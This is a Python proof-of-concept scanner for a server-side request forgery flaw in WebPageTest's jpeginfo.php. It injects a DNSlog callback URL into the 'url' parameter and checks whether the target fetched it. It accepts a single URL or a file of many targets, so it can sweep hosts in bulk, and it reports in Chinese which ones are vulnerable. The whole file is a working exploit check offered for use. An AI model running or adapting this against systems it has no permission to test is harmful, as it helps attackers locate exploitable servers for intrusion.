#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import sys
import urllib3
import time
from dnslog import get_dnslog,get_data
urllib3.disable_warnings()


def title():
    print("""
                 _                                 _               _                             __ 
                | |                               | |             | |                           / _|
__      __  ___ | |__   _ __    __ _   __ _   ___ | |_   ___  ___ | |_  ______  ___  ___  _ __ | |_ 
\ \ /\ / / / _ \| '_ \ | '_ \  / _` | / _` | / _ \| __| / _ \/ __|| __||______|/ __|/ __|| '__||  _|
 \ V  V / |  __/| |_) || |_) || (_| || (_| ||  __/| |_ |  __/\__ \| |_         \__ \\__ \| |   | |  
  \_/\_/   \___||_.__/ | .__/  \__,_| \__, | \___| \__| \___||___/ \__|        |___/|___/|_|   |_|  
                       | |             __/ |                                                                                                                                                                                                                    
                                                                                          
                                                                                        Author:Henry4E36
               """)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file


    def target_url(self):
        dnslog = get_dnslog()
        payload = self.url + f"/jpeginfo/jpeginfo.php?url=http://{dnslog}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }
        try:
            res = requests.get(url=payload, headers=headers,verify=False, timeout=10)
        except Exception as e:
            pass
        time.sleep(5)
        data = get_data()
        if dnslog in data:
            print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 存在SSRF漏洞！\033[0m")
            print("[" + "-"*100 + "]")
        else:
            print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在SSRF漏洞！")
            print("[" + "-"*100 + "]")
 

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='WebPageTest jpeginfo.php SSRF漏洞')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 webpagetest-ssrf.py -u http://127.0.0.1\neg2:>>>python3 webpagetest-ssrf.py -f ip.txt")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()